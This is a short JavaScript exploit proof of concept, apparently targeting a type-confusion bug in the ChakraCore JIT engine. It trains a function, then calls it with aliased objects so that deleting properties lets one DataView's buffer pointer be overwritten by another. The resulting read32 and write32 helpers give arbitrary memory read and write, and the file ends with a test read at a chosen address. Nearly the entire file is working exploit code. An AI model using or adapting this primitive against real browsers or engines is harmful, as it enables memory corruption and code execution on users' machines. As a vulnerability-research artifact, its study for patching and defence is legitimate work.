function opt(a, b) {
    a.a = dv
    delete b[0x100000004]
    delete b[0x100000003]
    delete b[0x100000002]
    delete b[0x100000001]
    delete b[0x100000000]
    let t = a.b
    a.e = victim_dv
    // return t
}

var ab = new ArrayBuffer(0x100)
var dv = new DataView(ab)
var victim_dv = new DataView(ab)

for (let i = 0; i < 3; i++) {
    var a = { a: 1, b: 1 }
    a[0x100000000] = 1
    a[0x100000001] = 1
    a[0x100000002] = 1
    a[0x100000003] = 1
    a[0x100000004] = 1
    opt(a, {}, true)
}



var a = { a: 1, b: 2 }
a[0x100000000] = 1
a[0x100000001] = 1
a[0x100000002] = 1
a[0x100000003] = 1
a[0x100000004] = 1
opt(a, a)

function set_addr(lo, hi) {
    dv.setUint32(0x38, lo, true)
    dv.setUint32(0x38 + 4, hi, true)
}

function read32(lo, hi) {
    set_addr(lo, hi)
    return victim_dv.getUint32(0, true)
}

function write32(lo, hi, v) {
    set_addr(lo, hi)
    return victim_dv.setUint32(0, v, true)
}


read32(0x11112222, 0x33334444) // crash at reading 0x3333444411112222
if (!a[0x100000004])
    WScript.Echo('pass');